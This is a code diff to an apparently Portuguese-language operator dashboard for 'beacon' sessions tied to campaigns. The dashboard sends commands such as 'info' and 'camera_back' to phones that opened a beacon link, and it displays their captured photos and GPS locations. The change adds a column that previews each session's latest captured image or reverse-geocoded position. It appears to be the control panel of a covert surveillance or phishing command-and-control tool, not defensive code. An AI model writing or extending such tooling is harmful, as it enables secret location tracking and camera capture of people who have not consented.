@@ -68,7 +68,7 @@ label{display:block;font-size:11px;color:#8b949e;margin-bottom:3px;text-transfor
     <h3>📡 Sessões / Beacons</h3>
     <div style="overflow-x:auto">
     <table id="sessTable">
-      <thead><tr><th>SID</th><th>Campanha</th><th>Status</th><th>UA</th><th>Último visto</th><th>Ações</th></tr></thead>
+      <thead><tr><th>SID</th><th>Campanha</th><th>Status</th><th>UA</th><th>Último visto</th><th>Últ. resultado</th><th>Ações</th></tr></thead>
       <tbody id="sessBody"></tbody>
     </table>
     </div>
@@ -104,6 +104,7 @@ function esc(s){
 }
 
 var geoCache={};
+var _geoQueue=[];
 function geocodeAddress(lat,lng,elId){
   var key=lat.toFixed(5)+','+lng.toFixed(5);
   var el=document.getElementById(elId);
@@ -123,8 +124,9 @@ function renderResults(results){
     var isImg=false,isLoc=false,lat=0,lng=0,acc='';
     try{
       var j=JSON.parse(val);
-      if(j.image&&j.image.length>100){isImg=true;val='<img src="'+j.image+'">'+(j.error?'<br>'+esc(j.error):'')}
+      if(j.image&&j.image.length>100){isImg=true;val='<img src="'+j.image+'" style="max-width:280px;border-radius:6px">'+(j.error?'<br>'+esc(j.error):'')}
       else if(j.lat!==undefined&&j.lng!==undefined){isLoc=true;lat=Number(j.lat);lng=Number(j.lng);acc=j.accuracy?(j.accuracy+'m'):''}
+      else if(j.error){val='<span style="color:#f85149">\u26a0 '+esc(j.error)+'</span>';isImg=true}
     }catch(e){}
     html+='<div class="result"><span class="cmd">'+esc(r.command)+'</span> • '+esc(new Date(r.received_at*1000).toLocaleTimeString('pt-BR'))+'<br>';
     if(isLoc){
@@ -138,6 +140,40 @@ function renderResults(results){
     html+=(isImg?val:esc(val).slice(0,500))+'</div>';
   });
   return html;
+}
+
+function lastMeaningful(res){
+  if(!res||!res.length)return null;
+  var j=null;
+  for(var i=res.length-1;i>=0;i--){
+    var v=res[i].result||'';j=null;
+    try{j=JSON.parse(v)}catch(e){}
+    if(j&&typeof j==='object'&&j.image&&j.image.length>100)return res[i];
+  }
+  for(var k=res.length-1;k>=0;k--){
+    var w=res[k].result||'';
+    if(w&&w!=='[]'&&w!=='{}'&&w!=='null'&&w!=='undefined')return res[k];
+  }
+  return res[res.length-1];
+}
+function previewResult(r,sid){
+  if(!r)return '<span style="color:#8b949e">\u2014</span>';
+  var val=r.result||'';
+  var j=null;
+  try{j=JSON.parse(val)}catch(e){}
+  if(j&&typeof j==='object'){
+    if(j.image&&j.image.length>100){
+      var errHtml=j.error?' <span style="color:#f85149">('+esc(j.error)+')</span>':'';
+      return '<img src="'+j.image+'" style="max-height:44px;max-width:120px;border-radius:4px;vertical-align:middle">'+errHtml;
+    }
+    if(j.error)return '<span style="color:#f85149">\u26a0 '+esc(j.error).slice(0,60)+'</span>';
+    if(j.lat!==undefined&&j.lng!==undefined){
+      var elId='geo-'+String(sid).replace(/[^a-zA-Z0-9]/g,'')+'-'+String(r.command||'loc').replace(/[^a-zA-Z0-9]/g,'');
+      _geoQueue.push({lat:Number(j.lat),lng:Number(j.lng),elId:elId});
+      return '<span id="'+elId+'">\ud83d\udccd '+Number(j.lat).toFixed(5)+', '+Number(j.lng).toFixed(5)+'</span>';
+    }
+  }
+  return '<span style="color:#8b949e">'+esc(val).slice(0,50)+'</span>';
 }
 
 function renderSessions(){
@@ -154,6 +190,7 @@ function renderSessions(){
         '<td><span class="badge '+(s.online?'on':'off')+'">'+(s.online?'● online':'○ off')+'</span></td>'+
         '<td>'+esc(shortUa(s.ua))+'</td>'+
         '<td>'+esc(s.age_seconds)+'s atrás</td>'+
+        '<td>'+(s.results&&s.results.length?previewResult(lastMeaningful(s.results),sid):'<span style="color:#8b949e">\u2014</span>')+'</td>'+
         '<td><button class="btn" onclick="showDetail(\''+sid+'\')">👁</button> '+
         '<button class="btn" onclick="cmd(\''+sid+'\',\'info\')">info</button> '+
         '<button class="btn" onclick="cmd(\''+sid+'\',\'camera_back\')">📷</button> '+
@@ -164,7 +201,9 @@ function renderSessions(){
         '</td></tr>';
       sessionCache[sid]=s;
     });
-    tbody.innerHTML=html||'<tr><td colspan="6" class="sub">Nenhuma sessão. Abra um beacon no celular.</td></tr>';
+    tbody.innerHTML=html||'<tr><td colspan="7" class="sub">Nenhuma sessão. Abra um beacon no celular.</td></tr>';
+    _geoQueue.forEach(function(q){geocodeAddress(q.lat,q.lng,q.elId)});
+    _geoQueue=[];
     document.getElementById('stTotal').textContent=Object.keys(d).length;
     var online=0,results=0;
     Object.keys(d).forEach(function(k){if(d[k].online)online++;results+=d[k].results_received});
